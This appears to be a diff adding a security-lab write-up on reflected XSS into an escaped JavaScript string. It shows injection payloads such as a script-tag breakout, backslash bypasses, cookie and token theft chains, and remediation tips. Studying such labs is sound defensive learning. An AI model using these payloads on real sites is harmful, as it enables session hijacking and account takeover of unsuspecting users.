@@ -7049,3 +7049,385 @@ Find input
 ✔ XSS achieved 💥  
 
 ---
+
+# 🐞 Lab 18 - Reflected XSS into JavaScript String (Escaped Quotes)
+
+---
+
+## 🔹 Overview
+
+Reflected XSS inside JavaScript occurs when:
+
+- User input is inserted inside a `<script>` block  
+- Specifically inside a JavaScript string  
+- The application escapes quotes using backslashes (`\`)  
+
+---
+
+👉 This makes simple payloads fail  
+👉 Requires JS-level bypass OR HTML-level breakout  
+
+---
+
+## 🔹 What Is This Topic?
+
+This is a **JavaScript context XSS**
+
+---
+
+## 🔄 Flow
+
+1️⃣ User sends input  
+2️⃣ Server places it inside JS string  
+
+```
+var input = 'USER_INPUT';
+```
+
+3️⃣ Application escapes quotes:
+
+```
+' → \'
+```
+
+4️⃣ Browser executes script  
+
+---
+
+## 🔹 Core Concepts
+
+---
+
+### 🟢 Escaped Characters
+
+```
+\'  → escaped quote (NOT string end)
+```
+
+---
+
+### 🟢 Backslash Behavior
+
+```
+\\  → one real backslash  
+\   → escape operator
+```
+
+---
+
+### 🟢 Parsing Order
+
+- HTML parsing → first  
+- JavaScript execution → second  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Test Input
+
+```
+XSS123
+```
+
+---
+
+### Step 2 — Observe Response
+
+```
+<script>
+var searchTerms = 'XSS123';
+</script>
+```
+
+✔ Input inside JS string  
+
+---
+
+## 📸 Screenshot 1 — Reflection in JS String
+
+![js-string](../images/js-string-reflection.png)
+
+---
+
+### Step 3 — Try Basic Payload
+
+```
+';alert(1);//
+```
+
+---
+
+### Step 4 — Result (Escaped)
+
+```
+var searchTerms = '\';alert(1);//';
+```
+
+❌ Payload fails  
+
+---
+
+### 🔴 Why It Failed
+
+- `'` becomes `\'`  
+- String NOT closed  
+- Payload stays as text  
+
+---
+
+## 📸 Screenshot 2 — Escaped Payload (Backslash Applied)
+
+![escaped-payload](../images/js-escaped-payload.png)
+
+---
+
+### Step 5 — Try Backslash Bypass
+
+```
+\\';alert(1);//
+```
+
+---
+
+### 🟡 Idea
+
+- First `\` cancels second `\`  
+- Quote becomes usable  
+
+---
+
+### Step 6 — Final Working Payload (HTML Breakout)
+
+```
+</script><script>alert(1)</script>
+```
+
+---
+
+### Step 7 — Resulting Output
+
+```
+<script>
+var searchTerms = '</script><script>alert(1)</script>';
+</script>
+```
+
+---
+
+## 📸 Screenshot 3 — Final Payload Execution
+
+![final-payload](../images/js-final-payload.png)
+
+---
+
+## 💥 Execution Flow
+
+1️⃣ `</script>` → closes current script  
+2️⃣ `<script>` → starts new script  
+3️⃣ `alert(1)` → executes  
+
+---
+
+## 🔹 Payload Breakdown
+
+---
+
+### 🎯 Payload
+
+```
+</script><script>alert(1)</script>
+```
+
+---
+
+### Parts
+
+```
+</script>  → break out of JS  
+<script>   → start new script  
+alert(1)   → execute  
+</script>  → close cleanly  
+```
+
+---
+
+## 🧩 Analogy
+
+JS string is locked ❌  
+HTML parser is weak ✔  
+
+👉 Break the script block instead of the string  
+
+---
+
+## 🔹 Why First Payload Failed
+
+```
+' → becomes \'
+```
+
+→ Not closing string  
+→ No execution  
+
+---
+
+## 🔹 Why Final Payload Worked
+
+- HTML parsing ignores JS escaping  
+- `</script>` closes block immediately  
+- New script executes  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Search Tracking Scripts
+
+```
+var q = 'USER_INPUT';
+```
+
+Payloads:
+
+```
+</script><script>alert(1)</script>
+\\';alert(1);//
+```
+
+---
+
+### 🟢 Analytics / Logging
+
+```
+track('USER_INPUT');
+```
+
+---
+
+### 🟢 Inline Script Data
+
+```
+var user = 'INPUT';
+```
+
+---
+
+### 🟢 JSON-like Objects
+
+```
+var data = {name: 'INPUT'};
+```
+
+Payload:
+
+```
+'};alert(1);//
+```
+
+---
+
+### 🟢 Escaped Environments
+
+When you see:
+
+```
+\'  or  \"
+```
+
+Use:
+
+```
+\\';alert(1);//
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Cookie Theft
+
+```
+document.cookie
+```
+
+---
+
+### 🔥 Token Theft
+
+```
+localStorage.getItem("token")
+```
+
+---
+
+### 🔥 Account Takeover
+
+- Change email  
+- Reset password  
+- Perform actions  
+
+---
+
+### 🔥 Admin Exploitation
+
+Send malicious link → executes in admin browser  
+
+---
+
+## 🛡️ Remediation
+
+- Context-aware JS escaping  
+- Use `JSON.stringify()`  
+- Avoid inline JS  
+- Use CSP  
+- Use secure frameworks  
+
+---
+
+## 💡 Pro Mindset
+
+- JS context is tricky  
+- Escaping ≠ safe  
+
+Always test:
+
+- JS breakout  
+- HTML breakout  
+
+---
+
+## 🧠 Techniques
+
+```
+'           → test quote  
+"           → alternate quote  
+\\          → bypass escape  
+</script>   → break script  
+```
+
+---
+
+## 🧠 Ultimate Mental Model
+
+Input  
+→ Reflection  
+→ Context (JS string)  
+→ Try JS break  
+→ If blocked → break HTML  
+→ Execute  
+
+---
+
+## 🎯 FINAL GOLDEN RULE
+
+If quotes are escaped  
+→ BREAK `<script>` instead  
+
+---
